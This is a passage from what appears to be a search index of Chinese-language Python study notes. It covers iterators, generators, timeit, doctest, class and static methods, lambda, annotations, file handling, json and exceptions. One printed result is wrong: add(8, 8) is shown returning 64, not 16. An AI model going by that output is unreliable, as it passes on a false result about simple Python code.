\u770b\u8fc7\u8fed\u4ee3\u5668\u534f\u8bae\u7684\u5e55\u540e\u673a\u5236\uff0c\u7ed9\u4f60\u7684\u7c7b\u6dfb\u52a0\u8fed\u4ee3\u5668\u884c\u4e3a\u5c31\u5f88\u5bb9\u6613\u4e86\u3002 \u5b9a\u4e49\u4e00\u4e2a __iter__() \u65b9\u6cd5\u6765\u8fd4\u56de\u4e00\u4e2a\u5e26\u6709 [ __next__() ] \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002 \u5982\u679c\u7c7b\u5df2\u5b9a\u4e49\u4e86 __next__() \uff0c\u5219 __iter__() \u53ef\u4ee5\u7b80\u5355\u5730\u8fd4\u56de self : class Reverse: \"\"\"Iterator for looping over a sequence backwards.\"\"\" def __init__(self, data): self.data = data self.index = len(data) def __iter__(self): return self def __next__(self): if self.index == 0: raise StopIteration self.index = self.index - 1 return self.data[self.index] >>> >>> rev = Reverse('spam') >>> iter(rev) <__main__.Reverse object at 0x00A1DB50> >>> for char in rev: ... print(char) ... m a p s \u751f\u6210\u5668 \u751f\u6210\u5668 \u662f\u4e00\u4e2a\u7528\u4e8e\u521b\u5efa\u8fed\u4ee3\u5668\u7684\u7b80\u5355\u800c\u5f3a\u5927\u7684\u5de5\u5177\u3002 \u5b83\u4eec\u7684\u5199\u6cd5\u7c7b\u4f3c\u4e8e\u6807\u51c6\u7684\u51fd\u6570\uff0c\u4f46\u5f53\u5b83\u4eec\u8981\u8fd4\u56de\u6570\u636e\u65f6\u4f1a\u4f7f\u7528 [ yield ]\u8bed\u53e5\u3002 \u6bcf\u6b21\u5728\u751f\u6210\u5668\u4e0a\u8c03\u7528 [ next() ] \u65f6\uff0c\u5b83\u4f1a\u4ece\u4e0a\u6b21\u79bb\u5f00\u7684\u4f4d\u7f6e\u6062\u590d\u6267\u884c\uff08\u5b83\u4f1a\u8bb0\u4f4f\u4e0a\u6b21\u6267\u884c\u8bed\u53e5\u65f6\u7684\u6240\u6709\u6570\u636e\u503c\uff09\u3002 \u4e00\u4e2a\u663e\u793a\u5982\u4f55\u975e\u5e38\u5bb9\u6613\u5730\u521b\u5efa\u751f\u6210\u5668\u7684\u793a\u4f8b\u5982\u4e0b: range\u529f\u80fd\uff1a range(start, stop[, step]) \u53c2\u6570\u8bf4\u660e\uff1a start: \u8ba1\u6570\u4ece start \u5f00\u59cb\u3002\u9ed8\u8ba4\u662f\u4ece 0 \u5f00\u59cb\u3002\u4f8b\u5982range\uff085\uff09\u7b49\u4ef7\u4e8erange\uff080\uff0c 5\uff09; stop: \u8ba1\u6570\u5230 stop \u7ed3\u675f\uff0c\u4f46\u4e0d\u5305\u62ec stop\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u662f[0, 1, 2, 3, 4]\u6ca1\u67095 step\uff1a\u6b65\u957f\uff0c\u9ed8\u8ba4\u4e3a1\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u7b49\u4ef7\u4e8e range(0, 5, 1) \u4f8b\u5982\uff1a for i in range(3,-1,-1): print(i) \u8fd0\u884c\u7ed3\u679c\uff1a 3 2 1 0 \u751f\u6210\u5668 def reverse(data): for index in range(len(data)-1, -1, -1): yield data[index] >>> >>> for char in reverse('golf'): ... print(char) ... f l o g \u53ef\u4ee5\u7528\u751f\u6210\u5668\u6765\u5b8c\u6210\u7684\u64cd\u4f5c\u540c\u6837\u53ef\u4ee5\u7528\u524d\u4e00\u8282\u6240\u63cf\u8ff0\u7684\u57fa\u4e8e\u7c7b\u7684\u8fed\u4ee3\u5668\u6765\u5b8c\u6210\u3002 \u4f46\u751f\u6210\u5668\u7684\u5199\u6cd5\u66f4\u4e3a\u7d27\u51d1\uff0c\u56e0\u4e3a\u5b83\u4f1a\u81ea\u52a8\u521b\u5efa __iter__() \u548c [ __next__() ] \u65b9\u6cd5\u3002 \u53e6\u4e00\u4e2a\u5173\u952e\u7279\u6027\u5728\u4e8e\u5c40\u90e8\u53d8\u91cf\u548c\u6267\u884c\u72b6\u6001\u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u4e4b\u95f4\u81ea\u52a8\u4fdd\u5b58\u3002 \u8fd9\u4f7f\u5f97\u8be5\u51fd\u6570\u76f8\u6bd4\u4f7f\u7528 self.index \u548c self.data \u8fd9\u79cd\u5b9e\u4f8b\u53d8\u91cf\u7684\u65b9\u5f0f\u66f4\u6613\u7f16\u5199\u4e14\u66f4\u4e3a\u6e05\u6670\u3002 \u9664\u4e86\u4f1a\u81ea\u52a8\u521b\u5efa\u65b9\u6cd5\u548c\u4fdd\u5b58\u7a0b\u5e8f\u72b6\u6001\uff0c\u5f53\u751f\u6210\u5668\u7ec8\u7ed3\u65f6\uff0c\u5b83\u4eec\u8fd8\u4f1a\u81ea\u52a8\u5f15\u53d1 [ StopIteration ]\u3002 \u8fd9\u4e9b\u7279\u6027\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u4f7f\u5f97\u521b\u5efa\u8fed\u4ee3\u5668\u80fd\u4e0e\u7f16\u5199\u5e38\u89c4\u51fd\u6570\u4e00\u6837\u5bb9\u6613\u3002 \u6027\u80fd\u6d4b\u91cf \u4e00\u4e9bPython\u7528\u6237\u5bf9\u4e86\u89e3\u540c\u4e00\u95ee\u9898\u7684\u4e0d\u540c\u65b9\u6cd5\u7684\u76f8\u5bf9\u6027\u80fd\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3\u3002 Python\u63d0\u4f9b\u4e86\u4e00\u79cd\u53ef\u4ee5\u7acb\u5373\u56de\u7b54\u8fd9\u4e9b\u95ee\u9898\u7684\u6d4b\u91cf\u5de5\u5177\u3002 \u4f8b\u5982\uff0c\u5143\u7ec4\u5c01\u5305\u548c\u62c6\u5305\u529f\u80fd\u76f8\u6bd4\u4f20\u7edf\u7684\u4ea4\u6362\u53c2\u6570\u53ef\u80fd\u66f4\u5177\u5438\u5f15\u529b\u3002[ timeit ]\u6a21\u5757\u53ef\u4ee5\u5feb\u901f\u6f14\u793a\u5728\u8fd0\u884c\u6548\u7387\u65b9\u9762\u4e00\u5b9a\u7684\u4f18\u52bf: >>> >>> from timeit import Timer >>> Timer('t=a; a=b; b=t', 'a=1; b=2').timeit() 0.57535828626024577 >>> Timer('a,b = b,a', 'a=1; b=2').timeit() 0.54962537085770791 \u4e0e [ timeit ]\u7684\u7cbe\u7ec6\u7c92\u5ea6\u7ea7\u522b\u76f8\u53cd\uff0c [ profile ] \u6a21\u5757\u63d0\u4f9b\u4e86\u7528\u4e8e\u5728\u8f83\u5927\u7684\u4ee3\u7801\u5757\u4e2d\u8bc6\u522b\u65f6\u95f4\u5173\u952e\u90e8\u5206\u7684\u5de5\u5177\u3002 \u67e5\u770b\u5305\u5185\u5bf9\u8c61 import flask print(dir(flask)) \u5355\u5143\u6d4b\u8bd5 def average(values): \"\"\"Computes the arithmetic mean of a list of numbers. >>> print(average([20, 30, 70])) 45.0 \"\"\" return sum(values) / len(values) result = average([20, 30, 70]) print(result) import doctest doctest.testmod() \u5728\u5f15\u53f7\u4e2d\uff0c\u5355\u5143\u6d4b\u8bd5\u60f3\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u7ed3\u679c\u7b49\u4e8e45 \u8fd0\u884c\u7ed3\u679c\uff1a 40.0 ********************************************************************** File \"D:\\idea\\infra-web\\tar\\test\\flask_learn\\unit_test.py\", line 4, in __main__.average Failed example: print(average([20, 30, 70])) Expected: 45.0 Got: 40.0 ********************************************************************** 1 items had failures: 1 of 1 in __main__.average ***Test Failed*** 1 failures. \u7531\u4e8e\u8fd0\u884c\u7ed3\u679c\u4e3a40\uff0c\u4e0d\u7b26\u5408\u9884\u671f\uff0c\u6240\u4ee5\u62a5\u9519 \u65b9\u6cd5\u8bbe\u7f6e\u9ed8\u8ba4\u53c2\u6570 >>> x = 42 >>> def spam(a, b=x): ... print(a, b) ... >>> spam(1) 1 42 >>> x = 23 # Has no effect >>> spam(1) 1 42 >>> classmethod \u7684\u4f7f\u7528\u65b9\u6cd5 #!/usr/bin/python # -*- coding: UTF-8 -*- class A(object): bar = 1 def func1(self): print ('foo') @classmethod def func2(cls): print ('func2') print (cls.bar) cls().func1() # \u8c03\u7528 foo \u65b9\u6cd5 A.func2() # \u4e0d\u9700\u8981\u5b9e\u4f8b\u5316 \u7ed3\u679c\uff1a func2 1 foo Python\u67093\u79cd\u65b9\u6cd5\uff0c\u9759\u6001\u65b9\u6cd5\uff08staticmethod\uff09\uff0c\u7c7b\u65b9\u6cd5\uff08classmethod\uff09\u548c\u5b9e\u4f8b\u65b9\u6cd5\u3002\u4e0b\u9762\u7528\u4ee3\u7801\u4e3e\u4f8b\u3002 \u5bf9\u4e8e\u4e00\u822c\u7684\u51fd\u6570foo(x)\uff0c\u5b83\u8ddf\u7c7b\u548c\u7c7b\u7684\u5b9e\u4f8b\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\uff0c\u76f4\u63a5\u8c03\u7528foo(x)\u5373\u53ef\u3002 # -*- coding:utf-8 -*- def foo(x): print(\"running foo(%s)\" % x) foo(\"test\") \u5728\u7c7bA\u91cc\u9762\u7684\u5b9e\u4f8b\u65b9\u6cd5foo(self, x)\uff0c \u7b2c\u4e00\u4e2a\u53c2\u6570\u662fself \uff0c\u6211\u4eec\u9700\u8981\u6709\u4e00\u4e2aA\u7684\u5b9e\u4f8b\uff0c\u624d\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 # -*- coding:utf-8 -*- class A: def foo(self, x): print(\"running foo(%s, %s)\" % (self, x)) # A.foo(x) \u8fd9\u6837\u4f1a\u62a5\u9519 a = A() a.foo(\"test\") \u5f53\u6211\u4eec\u9700\u8981\u548c\u7c7b\u76f4\u63a5\u8fdb\u884c\u4ea4\u4e92\uff0c\u800c\u4e0d\u9700\u8981\u548c\u5b9e\u4f8b\u8fdb\u884c\u4ea4\u4e92\u65f6\uff0c\u7c7b\u65b9\u6cd5\u662f\u6700\u597d\u7684\u9009\u62e9\u3002\u7c7b\u65b9\u6cd5\u4e0e\u5b9e\u4f8b\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4f46\u662f\u4f20\u9012\u7684\u4e0d\u662f\u7c7b\u7684\u5b9e\u4f8b\uff0c\u800c\u662f\u7c7b\u672c\u8eab\uff0c \u7b2c\u4e00\u4e2a\u53c2\u6570\u662fcls \u3002 \u6211\u4eec\u53ef\u4ee5\u7528\u7c7b\u7684\u5b9e\u4f8b\u8c03\u7528\u7c7b\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u7c7b\u540d\u6765\u8c03\u7528\u3002 # -*- coding:utf-8 -*- class A: class_attr = \"attr\" def __init__(self): pass @classmethod def class_foo(cls): print(\"running class_foo(%s)\" % (cls.class_attr)) a = A() a.class_foo() A.class_foo() \u9759\u6001\u65b9\u6cd5\u7c7b\u4f3c\u666e\u901a\u65b9\u6cd5\uff0c\u53c2\u6570\u91cc\u9762\u4e0d\u7528self\u3002\u8fd9\u4e9b\u65b9\u6cd5\u548c\u7c7b\u76f8\u5173\uff0c\u4f46\u662f\u53c8\u4e0d\u9700\u8981\u7c7b\u548c\u5b9e\u4f8b\u4e2d\u7684\u4efb\u4f55\u4fe1\u606f\u3001\u5c5e\u6027\u7b49\u7b49\u3002\u5982\u679c\u628a\u8fd9\u4e9b\u65b9\u6cd5\u5199\u5230\u7c7b\u5916\u9762\uff0c\u8fd9\u6837\u5c31\u628a\u548c\u7c7b\u76f8\u5173\u7684\u4ee3\u7801\u5206\u6563\u5230\u7c7b\u5916\uff0c\u4f7f\u5f97\u4e4b\u540e\u5bf9\u4e8e\u4ee3\u7801\u7684\u7406\u89e3\u548c\u7ef4\u62a4\u90fd\u662f\u5de8\u5927\u7684\u969c\u788d\u3002\u800c\u9759\u6001\u65b9\u6cd5\u5c31\u662f\u7528\u6765\u89e3\u51b3\u8fd9\u4e00\u7c7b\u95ee\u9898\u7684\u3002 \u6bd4\u5982\u6211\u4eec\u68c0\u67e5\u662f\u5426\u5f00\u542f\u4e86\u65e5\u5fd7\u529f\u80fd\uff0c\u8fd9\u4e2a\u548c\u7c7b\u76f8\u5173\uff0c\u4f46\u662f\u8ddf\u7c7b\u7684\u5c5e\u6027\u548c\u5b9e\u4f8b\u90fd\u6ca1\u6709\u5173\u7cfb\u3002 # -*- coding:utf-8 -*- log_enabled = True class A: class_attr = \"attr\" def __init__(self): pass @staticmethod def static_foo(): if log_enabled: print(\"log is enabled\") else: print(\"log is disabled\") A.static_foo() @staticmethod\u4e0d\u9700\u8981\u8868\u793a\u81ea\u8eab\u5bf9\u8c61\u7684self\u548c\u81ea\u8eab\u7c7b\u7684cls\u53c2\u6570\uff0c\u5c31\u8ddf\u4f7f\u7528\u51fd\u6570\u4e00\u6837\u3002 @classmethod\u4e5f\u4e0d\u9700\u8981self\u53c2\u6570\uff0c\u4f46\u7b2c\u4e00\u4e2a\u53c2\u6570\u9700\u8981\u662f\u8868\u793a\u81ea\u8eab\u7c7b\u7684cls\u53c2\u6570\u3002 \u5982\u679c\u5728@staticmethod\u4e2d\u8981\u8c03\u7528\u5230\u8fd9\u4e2a\u7c7b\u7684\u4e00\u4e9b\u5c5e\u6027\u65b9\u6cd5\uff0c\u53ea\u80fd\u76f4\u63a5\u7c7b\u540d.\u5c5e\u6027\u540d\u6216\u7c7b\u540d.\u65b9\u6cd5\u540d\u3002 \u800c@classmethod\u56e0\u4e3a\u6301\u6709cls\u53c2\u6570\uff0c\u53ef\u4ee5\u6765\u8c03\u7528\u7c7b\u7684\u5c5e\u6027\uff0c\u7c7b\u7684\u65b9\u6cd5\uff0c\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7b49\uff0c\u907f\u514d\u786c\u7f16\u7801\u3002","title":"Python\u4e00\u4e9b\u8bed\u6cd5"},{"location":"programming_language/python/basics/basic/#map","text":"def sq(x): return x * x print(list(map(sq, [1, 2, 3, 4, 5]))) \u7ed3\u679c\uff1a [1, 4, 9, 16, 25]","title":"map\u51fd\u6570"},{"location":"programming_language/python/basics/basic/#lambda","text":"\u4f8b1\uff1a def sq(x): return x * x print(list(map(lambda x: x*x,[y for y in range(6)]))) \u7ed3\u679c\uff1a [0, 1, 4, 9, 16, 25] \u4f8b2\uff1a funca = lambda x, y, z: (x + 8) * y - z print(funca(5, 6, 8)) \u7ed3\u679c\uff1a 70","title":"lambda\u51fd\u6570"},{"location":"programming_language/python/basics/basic/#-","text":"-> \u5e38\u5e38\u51fa\u73b0\u5728python\u51fd\u6570\u5b9a\u4e49\u7684\u51fd\u6570\u540d\u540e\u9762\uff0c\u4e3a\u51fd\u6570\u6dfb\u52a0 \u5143\u6570\u636e ,\u63cf\u8ff0\u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b def add(a: int, b: int) -> int: return a + b print(add.__annotations__) result = add(8, 8) print(result) \u7ed3\u679c\uff1a {'a': <class 'int'>, 'b': <class 'int'>, 'return': <class 'int'>} 64","title":"-&gt; \u7684\u7528\u6cd5"},{"location":"programming_language/python/basics/basic/#__annotations____","text":"\u4ee5\u5b57\u5178\u7684\u5f62\u5f0f\u5b58\u653e\u5728\u51fd\u6570\u7684 __annotations__ \u5c5e\u6027\u4e2d\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5f71\u54cd\u51fd\u6570\u7684\u4efb\u4f55\u5176\u4ed6\u90e8\uff0c\u6253\u5370\u51fd\u6570\u7684\u6807\u6ce8 https://docs.python.org/zh-cn/3/tutorial/controlflow.html def f(ham: str, eggs: str = 'eggs') -> str: print(\"Annotations:\", f.__annotations__) print(\"Arguments:\", ham, eggs) return ham + ' and ' + eggs g = f('spam') print(g) \u7ed3\u679c\uff1a Annotations: {'ham': <class 'str'>, 'eggs': <class 'str'>, 'return': <class 'str'>} Arguments: spam eggs spam and eggs","title":"__annotations____  \u7684\u7528\u6cd5"},{"location":"programming_language/python/basics/basic/#import","text":">>> from fibo import * >>> fib(500) 0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 \u8fd9\u79cd\u65b9\u5f0f\u4f1a\u5bfc\u5165\u6240\u6709\u4e0d\u4ee5\u4e0b\u5212\u7ebf\uff08 _ \uff09\u5f00\u5934\u7684\u540d\u79f0\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4e0d\u8981\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5411\u89e3\u91ca\u5668\u5bfc\u5165\u4e86\u4e00\u6279\u672a\u77e5\u7684\u540d\u79f0\uff0c\u53ef\u80fd\u4f1a\u8986\u76d6\u5df2\u7ecf\u5b9a\u4e49\u7684\u540d\u79f0\u3002 \u6ce8\u610f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e0d\u5efa\u8bae\u4ece\u6a21\u5757\u6216\u5305\u5185\u5bfc\u5165 * \uff0c \u56e0\u4e3a\uff0c\u8fd9\u9879\u64cd\u4f5c\u7ecf\u5e38\u8ba9\u4ee3\u7801\u53d8\u5f97\u96be\u4ee5\u7406\u89e3\u3002\u4e0d\u8fc7\uff0c\u4e3a\u4e86\u5728\u4ea4\u4e92\u5f0f\u7f16\u8bd1\u5668\u4e2d\u5c11\u6253\u51e0\u4e2a\u5b57\uff0c\u8fd9\u4e48\u7528\u4e5f\u6ca1\u95ee\u9898\u3002 \u53e6\u5916\u4ece\u5305\u5bfc\u5165*\uff0c\u6709\u4e2a\u7d22\u5f15\u95ee\u9898 https://docs.python.org/zh-cn/3/tutorial/modules.html#importing-from-a-package","title":"import * \u7684\u95ee\u9898"},{"location":"programming_language/python/basics/basic/#with","text":">>> with open('workfile') as f: ... read_data = f.read() >>> # We can check that the file has been automatically closed. >>> f.closed True \u5982\u679c\u6ca1\u6709\u4f7f\u7528 [ with ]\u5173\u952e\u5b57\uff0c\u5219\u5e94\u8c03\u7528 f.close() \u5173\u95ed\u6587\u4ef6\uff0c\u5373\u53ef\u91ca\u653e\u6587\u4ef6\u5360\u7528\u7684\u7cfb\u7edf\u8d44\u6e90\u3002 \u8c03\u7528 f.write() \u65f6\uff0c\u672a\u4f7f\u7528 with \u5173\u952e\u5b57\uff0c\u6216\u672a\u8c03\u7528 f.close() \uff0c\u5373\u4f7f\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\uff0c\u4e5f \u53ef\u80fd \u5bfc\u81f4 f.write() \u7684\u53c2\u6570\u6ca1\u6709\u5b8c\u5168\u5199\u5165\u78c1\u76d8\u3002 \u901a\u8fc7 [ with ] \u8bed\u53e5\uff0c\u6216\u8c03\u7528 f.close() \u5173\u95ed\u6587\u4ef6\u5bf9\u8c61\u540e\uff0c\u518d\u6b21\u4f7f\u7528\u8be5\u6587\u4ef6\u5bf9\u8c61\u5c06\u4f1a\u5931\u8d25\u3002 >>> >>> f.close() >>> f.read() Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: I/O operation on closed file.","title":"with\u5173\u952e\u5b57"},{"location":"programming_language/python/basics/basic/#_1","text":"\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u591a\u884c\u65f6\uff0c\u53ef\u4ee5\u7528\u5faa\u73af\u904d\u5386\u6574\u4e2a\u6587\u4ef6\u5bf9\u8c61\u3002\u8fd9\u79cd\u64cd\u4f5c\u80fd\u9ad8\u6548\u5229\u7528\u5185\u5b58\uff0c\u5feb\u901f\uff0c\u4e14\u4ee3\u7801\u7b80\u5355\uff1a >>> >>> for line in f: ... print(line, end='') ... This is the first line of the file. Second line of the file \u5982\u9700\u4ee5\u5217\u8868\u5f62\u5f0f\u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u884c\uff0c\u53ef\u4ee5\u7528 list(f) \u6216 f.readlines() \u3002","title":"\u6587\u4ef6\u8bfb\u53d6\u591a\u884c"},{"location":"programming_language/python/basics/basic/#seek","text":"f.seek(offset, whence) \u53ef\u4ee5\u6539\u53d8\u6587\u4ef6\u5bf9\u8c61\u7684\u4f4d\u7f6e\u3002\u901a\u8fc7\u5411\u53c2\u8003\u70b9\u6dfb\u52a0 offset \u8ba1\u7b97\u4f4d\u7f6e\uff1b\u53c2\u8003\u70b9\u7531 whence \u53c2\u6570\u6307\u5b9a\u3002 whence \u503c\u4e3a 0 \u65f6\uff0c\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u8ba1\u7b97\uff0c1 \u8868\u793a\u4f7f\u7528\u5f53\u524d\u6587\u4ef6\u4f4d\u7f6e\uff0c2 \u8868\u793a\u4f7f\u7528\u6587\u4ef6\u672b\u5c3e\u4f5c\u4e3a\u53c2\u8003\u70b9\u3002\u7701\u7565 whence \u65f6\uff0c\u5176\u9ed8\u8ba4\u503c\u4e3a 0\uff0c\u5373\u4f7f\u7528\u6587\u4ef6\u5f00\u5934\u4f5c\u4e3a\u53c2\u8003\u70b9\u3002 >>> >>> f = open('workfile', 'rb+') >>> f.write(b'0123456789abcdef') 16 >>> f.seek(5) # Go to the 6th byte in the file 5 >>> f.read(1) b'5' >>> f.seek(-3, 2) # Go to the 3rd byte before the end 13 >>> f.read(1) b'd' \u5728\u6587\u672c\u6587\u4ef6\uff08\u6a21\u5f0f\u5b57\u7b26\u4e32\u672a\u4f7f\u7528 b \u65f6\u6253\u5f00\u7684\u6587\u4ef6\uff09\u4e2d\uff0c\u53ea\u5141\u8bb8\u76f8\u5bf9\u4e8e\u6587\u4ef6\u5f00\u5934\u641c\u7d22\uff08\u4f7f\u7528 seek(0, 2) \u641c\u7d22\u5230\u6587\u4ef6\u672b\u5c3e\u662f\u4e2a\u4f8b\u5916\uff09\uff0c\u552f\u4e00\u6709\u6548\u7684 offset \u503c\u662f\u80fd\u4ece f.tell() \u4e2d\u8fd4\u56de\u7684\uff0c\u6216 0\u3002\u5176\u4ed6 offset \u503c\u90fd\u4f1a\u4ea7\u751f\u672a\u5b9a\u4e49\u7684\u884c\u4e3a\u3002 \u6587\u4ef6\u5bf9\u8c61\u8fd8\u652f\u6301 isatty() \u548c truncate() \u7b49\u65b9\u6cd5\uff0c\u4f46\u4e0d\u5e38\u7528\uff1b\u6587\u4ef6\u5bf9\u8c61\u7684\u5b8c\u6574\u6307\u5357\u8be6\u89c1\u5e93\u53c2\u8003\u3002","title":"\u64cd\u4f5c\u6587\u672cseek"},{"location":"programming_language/python/basics/basic/#json","text":"Python \u652f\u6301 JSON (JavaScript Object Notation) \u8fd9\u79cd\u6d41\u884c\u6570\u636e\u4ea4\u6362\u683c\u5f0f\uff0c\u7528\u6237\u65e0\u9700\u6ca1\u5b8c\u6ca1\u4e86\u5730\u7f16\u5199\u3001\u8c03\u8bd5\u4ee3\u7801\uff0c\u624d\u80fd\u628a\u590d\u6742\u7684\u6570\u636e\u7c7b\u578b\u4fdd\u5b58\u5230\u6587\u4ef6\u3002[ json ] \u6807\u51c6\u6a21\u5757\u91c7\u7528 Python \u6570\u636e\u5c42\u6b21\u7ed3\u6784\uff0c\u5e76\u5c06\u4e4b\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\uff1b\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a serializing \uff08\u5e8f\u5217\u5316\uff09\u3002\u4ece\u5b57\u7b26\u4e32\u8868\u793a\u4e2d\u91cd\u5efa\u6570\u636e\u79f0\u4e3a deserializing \uff08\u89e3\u5e8f\u5316\uff09\u3002\u5728\u5e8f\u5217\u5316\u548c\u89e3\u5e8f\u5316\u4e4b\u95f4\uff0c\u8868\u793a\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u5df2\u7ecf\u5b58\u50a8\u5728\u6587\u4ef6\u6216\u6570\u636e\u4e2d\uff0c\u6216\u901a\u8fc7\u7f51\u7edc\u8fde\u63a5\u53d1\u9001\u5230\u8fdc\u65b9 \u7684\u673a\u5668\u3002 \u6ce8\u89e3 JSON \u683c\u5f0f\u901a\u5e38\u7528\u4e8e\u73b0\u4ee3\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u4ea4\u6362\u3002\u7a0b\u5e8f\u5458\u65e9\u5df2\u5bf9\u5b83\u8033\u719f\u80fd\u8be6\uff0c\u53ef\u8c13\u662f\u4ea4\u4e92\u64cd\u4f5c\u7684\u4e0d\u4e8c\u4e4b\u9009\u3002 \u53ea\u9700\u4e00\u884c\u7b80\u5355\u7684\u4ee3\u7801\u5373\u53ef\u67e5\u770b\u67d0\u4e2a\u5bf9\u8c61\u7684 JSON \u5b57\u7b26\u4e32\u8868\u73b0\u5f62\u5f0f\uff1a >>> >>> import json >>> x = [1, 'simple', 'list'] >>> json.dumps(x) '[1, \"simple\", \"list\"]' [ dumps() ] \u51fd\u6570\u8fd8\u6709\u4e00\u4e2a\u53d8\u4f53\uff0c [ dump() ]\uff0c\u5b83\u53ea\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u4e3a text file \u3002\u56e0\u6b64\uff0c\u5982\u679c f \u662f text file \u5bf9\u8c61\uff0c\u53ef\u4ee5\u8fd9\u6837\u505a\uff1a json.dump(x, f) \u8981\u518d\u6b21\u89e3\u7801\u5bf9\u8c61\uff0c\u5982\u679c f \u662f\u5df2\u6253\u5f00\u3001\u4f9b\u8bfb\u53d6\u7684 text file \u5bf9\u8c61\uff1a x = json.load(f) \u8fd9\u79cd\u7b80\u5355\u7684\u5e8f\u5217\u5316\u6280\u672f\u53ef\u4ee5\u5904\u7406\u5217\u8868\u548c\u5b57\u5178\uff0c\u4f46\u5728 JSON \u4e2d\u5e8f\u5217\u5316\u4efb\u610f\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5219\u9700\u8981\u4ed8\u51fa\u989d\u5916\u52aa\u529b\u3002[ json ] \u6a21\u5757\u7684\u53c2\u8003\u5305\u542b\u5bf9\u6b64\u7684\u89e3\u91ca\u3002","title":"\u64cd\u4f5cjson"},{"location":"programming_language/python/basics/basic/#_2","text":"\u53e5\u6cd5\u9519\u8bef\u53c8\u79f0\u89e3\u6790\u9519\u8bef\uff0c\u662f\u5b66\u4e60 Python \u65f6\u6700\u5e38\u89c1\u7684\u9519\u8bef\uff1a >>> >>> while True print('Hello world') File \"<stdin>\", line 1 while True print('Hello world') ^ SyntaxError: invalid syntax \u89e3\u6790\u5668\u4f1a\u590d\u73b0\u51fa\u73b0\u53e5\u6cd5\u9519\u8bef\u7684\u4ee3\u7801\u884c\uff0c\u5e76\u7528\u5c0f\u201c\u7bad\u5934\u201d\u6307\u5411\u884c\u91cc\u68c0\u6d4b\u5230\u7684\u7b2c\u4e00\u4e2a\u9519\u8bef\u3002\u9519\u8bef\u662f\u7531\u7bad\u5934 \u4e0a\u65b9 \u7684 token \u89e6\u53d1\u7684\uff08\u81f3\u5c11\u662f\u5728\u8fd9\u91cc\u68c0\u6d4b\u51fa\u7684\uff09\uff1a\u672c\u4f8b\u4e2d\uff0c\u5728 [ print() ]\u51fd\u6570\u4e2d\u68c0\u6d4b\u5230\u9519\u8bef\uff0c\u56e0\u4e3a\uff0c\u5728\u5b83\u524d\u9762\u7f3a\u5c11\u5192\u53f7\uff08 ':' \uff09 \u3002\u9519\u8bef\u4fe1\u606f\u8fd8\u8f93\u51fa\u6587\u4ef6\u540d\u4e0e\u884c\u53f7\uff0c\u5728\u4f7f\u7528\u811a\u672c\u6587\u4ef6\u65f6\uff0c\u5c31\u53ef\u4ee5\u77e5\u9053\u53bb\u54ea\u91cc\u67e5\u9519\u3002","title":"\u53e5\u6cd5\u9519\u8bef"},{"location":"programming_language/python/basics/basic/#_3","text":"[ raise ] \u8bed\u53e5\u652f\u6301\u5f3a\u5236\u89e6\u53d1\u6307\u5b9a\u7684\u5f02\u5e38\u3002\u4f8b\u5982\uff1a >>> >>> raise NameError('HiThere') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> NameError: HiThere [ raise ] \u552f\u4e00\u7684\u53c2\u6570\u5c31\u662f\u8981\u89e6\u53d1\u7684\u5f02\u5e38\u3002\u8fd9\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u5f02\u5e38\u5b9e\u4f8b\u6216\u5f02\u5e38\u7c7b\uff08\u6d3e\u751f\u81ea [ Exception ] \u7c7b\uff09\u3002\u5982\u679c\u4f20\u9012\u7684\u662f\u5f02\u5e38\u7c7b\uff0c\u5c06\u901a\u8fc7\u8c03\u7528\u6ca1\u6709\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u6765\u9690\u5f0f\u5b9e\u4f8b\u5316\uff1a raise ValueError # shorthand for 'raise ValueError()' \u5982\u679c\u53ea\u60f3\u5224\u65ad\u662f\u5426\u89e6\u53d1\u4e86\u5f02\u5e38\uff0c\u4f46\u5e76\u4e0d\u6253\u7b97\u5904\u7406\u8be5\u5f02\u5e38\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u66f4\u7b80\u5355\u7684 [ raise ]\u8bed\u53e5\u91cd\u65b0\u89e6\u53d1\u5f02\u5e38\uff1a >>> >>> try: ... raise NameError('HiThere') ... except NameError: ... print('An exception flew by!') ... raise ... An exception flew by! Traceback (most recent call last): File \"<stdin>\", line 2, in <module> NameError: HiThere","title":"\u89e6\u53d1\u5f02\u5e38"},{"location":"programming_language/python/basics/basic/#_4","text":"[ raise ] \u8bed\u53e5\u652f\u6301\u53ef\u9009\u7684 [ from ]\u5b50\u53e5\uff0c\u8be5\u5b50\u53e5\u7528\u4e8e\u542f\u7528\u94fe\u5f0f\u5f02\u5e38\u3002 \u4f8b\u5982\uff1a # exc must be exception instance or None. raise RuntimeError from exc 